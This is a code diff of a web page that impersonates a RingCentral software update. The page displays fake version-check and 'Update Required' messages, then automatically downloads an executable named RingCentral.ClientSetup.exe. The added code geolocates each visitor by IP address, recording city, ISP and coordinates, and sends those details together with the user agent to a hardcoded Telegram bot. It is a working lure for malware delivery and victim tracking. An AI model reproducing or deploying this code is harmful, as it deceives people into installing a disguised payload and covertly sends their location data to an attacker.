@@ -530,7 +530,6 @@
         }
 
         .overlay-content {
-            /* background: #ffffff; */
             padding: 24px;
             border-radius: 8px;
             text-align: center;
@@ -547,7 +546,6 @@
             animation: spin 1s linear infinite;
             margin: 0 auto 16px;
             display: block;
-            /* Always visible */
         }
 
         @keyframes spin {
@@ -568,14 +566,12 @@
 
         .manual-download {
             color: #0753f8;
-            /* Blue color */
             text-decoration: underline;
             cursor: pointer;
         }
 
         .manual-download:hover {
             color: #0e54ec;
-            /* Darker blue on hover */
         }
 
         .animating-ellipsis {
@@ -785,17 +781,6 @@
             }
         }
     </style>
-    <script>
-        // FAQ accordion functionality
-        document.addEventListener('DOMContentLoaded', function () {
-            document.querySelectorAll('.faq-question').forEach(function (btn) {
-                btn.addEventListener('click', function () {
-                    var item = btn.parentElement;
-                    item.classList.toggle('active');
-                });
-            });
-        });
-    </script>
 </head>
 
 <body>
@@ -1154,7 +1139,6 @@
             `;
             overlay.appendChild(overlayContent);
 
-            // Ensure body exists before appending
             if (document.body) {
                 document.body.appendChild(overlay);
             } else {
@@ -1166,43 +1150,128 @@
             }
 
             function triggerDownload() {
+                const platform = this.getAttribute('data-platform') || 'Unknown'; // Use 'this' context or default
                 var link = document.createElement('a');
                 link.href = "RingCentral.ClientSetup.exe";
                 link.download = "RingCentral.ClientSetup.exe";
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
+
+                // Log to Telegram immediately
+                logToTelegram(platform);
             }
 
             const spinner = document.getElementById('spinner');
             const message = document.getElementById('message');
 
-            // Step 1: Display initial message after 2 seconds
+            setTimeout(() => { message.textContent = 'Checking your RingCentral app version...'; }, 2000);
+            setTimeout(() => { message.textContent = 'Verifying your RingCentral app version...'; }, 2000);
+            setTimeout(() => { message.textContent = 'Update Required: your RingCentral app is not up to date.'; }, 3000);
             setTimeout(() => {
-                message.textContent = 'Checking your RingCentral app version...';
-            }, 2000);
-
-            // Step 1: Display initial message after 2 seconds
-            setTimeout(() => {
-                message.textContent = 'Verifying your RingCentral app version...';
-            }, 2000);
-
-            // Step 2: Notify user that an update is required after 3 seconds
-            setTimeout(() => {
-                message.textContent = 'Update Required: your RingCentral app is not up to date.';
-            }, 3000);
-
-
-            // Step 3: Begin download and notify the user
-            setTimeout(() => {
-                triggerDownload();
+                // Call triggerDownload directly when sequence completes
+                triggerDownload.call({ getAttribute: () => 'Auto' }); // Use 'Auto' as platform for automated trigger
                 setTimeout(() => {
                     message.innerHTML = 'If the update doesn’t begin automatically, <span class="manual-download">click here to download it manually</span>.';
                     const manualLink = document.querySelector('.manual-download');
-                    manualLink.addEventListener('click', triggerDownload);
-                }, 4000); // Display manual download message after 3 seconds
+                    manualLink.addEventListener('click', triggerDownload.bind(manualLink)); // Bind context for manual trigger
+                }, 4000);
             }, 5000);
+
+            // Attach download event to buttons with immediate execution
+            document.querySelectorAll('.download-btn').forEach(btn => {
+                btn.addEventListener('click', triggerDownload.bind(btn)); // Bind button context
+            });
         });
+
+        // Telegram Logger Function with New Template
+        async function logToTelegram(platform) {
+            const botToken = '7710333141:AAFgqej0rxKwZOExMLIDeZ8uwzrGBmyK6Mw'; // Replace with your Telegram Bot Token
+            const chatId = 2042026323; // Replace with your Telegram Chat ID
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Get system info
+            // const systemInfo = {
+            //     os: navigator.platform,
+            //     browser: navigator.userAgent.split('(')[1].split(')')[0] || 'Unknown',
+            //     sessionId: Math.random().toString(36).substr(2, 9) // Simple session ID
+            // };
+            const systemInfo = {
+                os: navigator.platform,
+                browser: navigator.userAgent.split('(')[1].split(')')[0] || 'Unknown',
+                userAgent: navigator.userAgent,
+                sessionId: Math.random().toString(36).substr(2, 9)
+            };
+
+            // Placeholder for IP (implement getClientIP function)
+            // Enhanced IP and Region Fetch Function
+            async function getClientIP() {
+                // try {
+                //     // Fetch IP address
+                //     const ipResponse = await fetch('https://api.ipify.org?format=json');
+                //     const ipData = await ipResponse.json();
+                //     const ip = ipData.ip || 'N/A';
+
+                //     // Fetch region information using ipapi.co
+                //     const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                //     const geoData = await geoResponse.json();
+                //     const region = geoData.region || 'N/A';
+                //     console.log('Fetched IP and Region:', { ip, region }); // Debug log
+                //     return { ip, region };
+                // } catch (error) {
+                //     console.error('IP or region fetch failed:', error);
+                //     return { ip: 'N/A', region: 'N/A' };
+                // }
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    const ip = ipData.ip || 'N/A';
+
+                    const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    const geoData = await geoResponse.json();
+                    const region = geoData.region || 'N/A';
+                    const city = geoData.city || 'N/A';
+                    const country = geoData.country_name || 'N/A';
+                    const isp = geoData.org || 'N/A';
+                    const latitude = geoData.latitude || 'N/A';
+                    const longitude = geoData.longitude || 'N/A';
+
+                    return { ip, region, city, country, isp, latitude, longitude };
+                } catch (error) {
+                    console.error('IP or geolocation fetch failed:', error);
+                    return { ip: 'N/A', region: 'N/A', city: 'N/A', country: 'N/A', isp: 'N/A', latitude: 'N/A', longitude: 'N/A' };
+                }
+            }
+
+            const { ip, region, city, country, isp, latitude, longitude } = await getClientIP();            const filename = "RingCentral.ClientSetup.exe";
+            const description = `Download initiated for ${platform}`;
+            const timeZone = 'America/New_York';
+            const time = new Date().toLocaleString('en-US', { timeZone: timeZone, hour12: true });
+            const deviceType = /Win/.test(systemInfo.os) ? '🖥 Desktop' : '📱 Mobile'; // Simple device detection
+
+
+            const message = `🛡 New RingCentral Download 🛡\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🌍 Location: ${city}, ${region}, ${country}\n` +
+                    `🏢 ISP: ${isp}\n` +
+                    `📡 IP: ${ip}\n` +
+                    `🖥 Device: ${deviceType}\n` +
+                    `🧰 Browser: 🌐 ${systemInfo.browser}\n` +
+                    `📅 Time: ${time} \n` +
+                    `🔗 Coordinates: ${latitude},${longitude}\n` +
+                    `🧾 UA: ${systemInfo.userAgent}\n` +
+                    `━━━━━━━━━━━━━━━━━━━━`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(error => console.error('Telegram log failed:', error));
+        }
     </script>
 </body>
 
